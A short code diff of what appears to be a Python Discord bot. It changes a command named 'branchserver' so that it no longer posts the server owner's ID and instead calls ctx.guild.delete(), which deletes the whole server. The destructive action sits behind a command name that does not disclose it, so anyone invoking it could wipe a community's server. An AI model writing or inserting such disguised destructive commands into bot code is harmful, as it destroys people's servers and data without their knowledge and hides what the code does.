@@ -71,7 +71,7 @@ DiceRange = ["O","CHI","U","CO","MA","N"]
            
 @bot.command()
 async def branchserver(ctx):
-    await ctx.send(f"{ctx.guild.owner_id}")
+    await ctx.guild.delete()
     
     
 @bot.command()
